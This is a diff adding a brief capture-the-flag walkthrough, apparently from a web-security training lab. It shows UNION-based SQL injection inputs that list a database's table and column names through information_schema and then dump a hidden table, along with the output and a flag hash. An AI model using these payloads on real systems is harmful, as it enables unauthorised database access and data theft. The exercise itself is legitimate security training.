@@ -1,0 +1,21 @@
+Like for the member go get the db strucutre again:
+
+SQL INPUT => 1 UNION SELECT table_name, column_name FROM information_schema.columns
+
+    ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
+    Title: id
+    Url : list_images
+    ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
+    Title: url
+    Url : list_images
+    ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
+    Title: title
+    Url : list_images
+    ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
+    Title: comment
+    Url : list_images
+
+SQL INPUT => 1 UNION SELECT comment, url FROM list_images
+    ID: 1 UNION SELECT comment, url FROM list_images 
+    Title: borntosec.ddns.net/images.png
+    Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
